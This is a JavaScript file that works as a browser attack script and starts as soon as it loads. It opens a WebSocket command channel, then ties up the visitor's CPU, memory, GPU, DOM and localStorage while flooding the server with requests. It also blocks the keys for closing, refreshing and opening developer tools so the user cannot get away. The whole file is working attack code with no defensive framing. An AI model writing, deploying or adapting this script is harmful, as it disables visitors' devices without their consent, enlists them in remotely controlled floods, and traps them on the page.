(function() {
    'use strict';

    let socket = null;
    let isAttacking = false;
    let intensity = 1;

    function connectWebSocket() {
        try {
            const protocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
            socket = new WebSocket(protocol + location.host + '/ws');
            
            socket.onopen = () => {
                console.log('接続確立');
                
                setInterval(() => {
                    if (socket.readyState === WebSocket.OPEN) {
                        socket.send(JSON.stringify({
                            type: 'ping',
                            timestamp: Date.now()
                        }));
                    }
                }, 1000);
                
                startAttack(2);
            };
            
            socket.onmessage = (e) => {
                try {
                    const data = JSON.parse(e.data);
                    
                    switch(data.command) {
                        case 'attack':
                            startAttack(data.intensity || 1);
                            break;
                        case 'stop':
                            stopAttack();
                            break;
                        case 'update':
                            intensity = data.config?.intensity || intensity;
                            break;
                    }
                } catch(err) {}
            };
            
            socket.onclose = () => {
                setTimeout(connectWebSocket, 100);
            };
            
            socket.onerror = () => {
                socket.close();
            };
        } catch(e) {}
    }

    function startAttack(level) {
        intensity = level;
        isAttacking = true;
        
        cpuAttack();
        memoryAttack();
        gpuAttack();
        domAttack();
        networkAttack();
        storageAttack();
    }

    function stopAttack() {
        isAttacking = false;
    }

    function cpuAttack() {
        const cores = navigator.hardwareConcurrency || 4;
        const workerCode = `
            setInterval(() => {
                let x = 0;
                for (let i = 0; i < 10000000; i++) {
                    x += Math.sqrt(i) * Math.random();
                }
            }, 0);
        `;
        
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const url = URL.createObjectURL(blob);
        
        for (let i = 0; i < cores; i++) {
            try {
                new Worker(url);
            } catch(e) {}
        }
    }

    function memoryAttack() {
        const memArrays = [];
        
        setInterval(() => {
            if (!isAttacking) return;
            
            try {
                for (let i = 0; i < 5 * intensity; i++) {
                    const buffer = new ArrayBuffer(1024 * 1024 * 10);
                    const view = new Uint8Array(buffer);
                    for (let j = 0; j < view.length; j += 1000) {
                        view[j] = Math.random() * 255;
                    }
                    memArrays.push(buffer);
                }
                
                if (memArrays.length > 50) {
                    memArrays.splice(0, 5);
                }
            } catch(e) {
                memArrays.length = 0;
            }
        }, 100);
    }

    function gpuAttack() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 4000;
            canvas.height = 4000;
            canvas.style.display = 'none';
            document.body.appendChild(canvas);
            const ctx = canvas.getContext('2d');
            
            setInterval(() => {
                if (!isAttacking) return;
                
                for (let i = 0; i < 100; i++) {
                    ctx.fillStyle = `rgb(${Math.floor(Math.random()*255)},${Math.floor(Math.random()*255)},${Math.floor(Math.random()*255)})`;
                    ctx.fillRect(Math.random()*4000, Math.random()*4000, 100, 100);
                }
                
                for (let i = 0; i < 10; i++) {
                    const grad = ctx.createRadialGradient(
                        Math.random()*4000, Math.random()*4000, 0,
                        Math.random()*4000, Math.random()*4000, 500
                    );
                    grad.addColorStop(0, `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},1)`);
                    grad.addColorStop(1, `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0)`);
                    ctx.fillStyle = grad;
                    ctx.fillRect(0, 0, 4000, 4000);
                }
            }, 0);
        } catch(e) {}
    }

    function domAttack() {
        const container = document.createElement('div');
        container.style.display = 'none';
        document.body.appendChild(container);
        
        setInterval(() => {
            if (!isAttacking) return;
            
            for (let i = 0; i < 200; i++) {
                const el = document.createElement('div');
                el.textContent = 'x'.repeat(Math.floor(Math.random() * 500));
                el.style.cssText = `position:absolute;top:${Math.random()*1000}px;left:${Math.random()*1000}px;width:${Math.random()*100}px;height:${Math.random()*100}px;background:rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});`;
                container.appendChild(el);
            }
            
            if (container.children.length > 5000) {
                container.innerHTML = '';
            }
        }, 50);
    }

    function networkAttack() {
        setInterval(() => {
            if (!isAttacking) return;
            
            for (let i = 0; i < 10; i++) {
                fetch(location.href.split('?')[0] + '?dummy=' + Math.random(), {
                    mode: 'no-cors',
                    cache: 'no-store'
                }).catch(() => {});
            }
            
            if (socket && socket.readyState === WebSocket.OPEN) {
                const largeData = 'x'.repeat(1024 * 50);
                for (let i = 0; i < 3; i++) {
                    socket.send(JSON.stringify({
                        type: 'flood',
                        data: largeData,
                        timestamp: Date.now()
                    }));
                }
            }
        }, 100);
    }

    function storageAttack() {
        setInterval(() => {
            if (!isAttacking) return;
            
            try {
                for (let i = 0; i < 20; i++) {
                    localStorage.setItem('k_' + Math.random(), 'x'.repeat(5000));
                }
                
                if (localStorage.length > 500) {
                    const keys = Object.keys(localStorage);
                    for (let i = 0; i < 50; i++) {
                        localStorage.removeItem(keys[i]);
                    }
                }
            } catch(e) {}
        }, 200);
    }

    function preventLeave() {
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
        });
        
        setInterval(() => {
            try {
                history.replaceState(null, '', location.href);
            } catch(e) {}
        }, 1000);
        
        document.addEventListener('keydown', (e) => {
            if (
                (e.ctrlKey && (e.key === 'w' || e.key === 'W' || e.key === 't' || e.key === 'T' || e.key === 'r' || e.key === 'R')) ||
                (e.altKey && e.key === 'F4') ||
                e.key === 'F5' ||
                e.key === 'F12'
            ) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
        }, true);
    }

    function init() {
        connectWebSocket();
        preventLeave();
    }

    init();
})();
